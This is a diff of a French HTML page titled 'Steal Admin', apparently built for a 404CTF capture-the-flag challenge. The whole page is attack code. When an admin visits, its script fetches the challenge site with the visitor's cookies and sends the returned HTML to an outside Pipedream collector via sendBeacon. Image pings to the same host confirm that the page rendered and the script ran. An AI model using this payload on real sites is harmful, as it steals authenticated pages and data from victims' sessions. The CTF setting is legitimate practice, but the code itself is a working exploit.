@@ -2,42 +2,41 @@
 <html lang="fr">
   <head>
     <meta charset="UTF-8" />
-    <title>Steal Admin</title>
+    <title>Steal Admin – Debug</title>
   </head>
   <body>
-    <h1>Contenu volé :</h1>
+    <h1>Dump admin :</h1>
     <pre id="out">en attente…</pre>
 
-    <!-- confirmation de rendu -->
-    <img src="https://eoyi24wnc60zgb.m.pipedream.net?test=1" alt="" />
+    <!-- 1️⃣ Requête statique pour prouver que la page arrive bien -->
+    <img src="https://eoyi24wnc60zgb.m.pipedream.net?test=static" alt="ok" />
 
     <script>
       (async () => {
-        // 1) Récupère la home du challenge AVEC le cookie admin
+        // 2️⃣ Requête dynamique *immédiate* : si tu vois "test=js" dans Pipedream,
+        //    c’est que ton JS a démarré correctement.
+        new Image().src = "https://eoyi24wnc60zgb.m.pipedream.net?test=js";
+
+        // 3️⃣ Petite marque visuelle dans le DOM pour voir dans le <pre>.
+        document.getElementById("out").textContent = "[JS démarré]";
+
+        // 4️⃣ On va chercher la home du challenge en first-party (token admin envoyé).
         const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
           credentials: "include",
         });
+
+        // 5️⃣ On lit le HTML complet
         const html = await resp.text();
 
-        // 2) Affiche local pour vérif
+        // 6️⃣ On l’affiche pour debug
         document.getElementById("out").textContent = html;
 
-        // 3) Exfiltration fiable en POST :
-        //    sendBeacon autorise les gros payloads même en mode no-cors
+        // 7️⃣ Exfiltration finale en POST (beacon) pour ne pas tronquer le contenu.
         const blob = new Blob([html], { type: "text/plain" });
         navigator.sendBeacon(
           "https://eoyi24wnc60zgb.m.pipedream.net/collect",
           blob
         );
-
-        // — ou, si tu préfères fetch :
-        /*
-    fetch("https://eoyi24wnc60zgb.m.pipedream.net/collect", {
-      method: "POST",
-      mode:   "no-cors",
-      body:   html
-    });
-    */
       })();
     </script>
   </body>
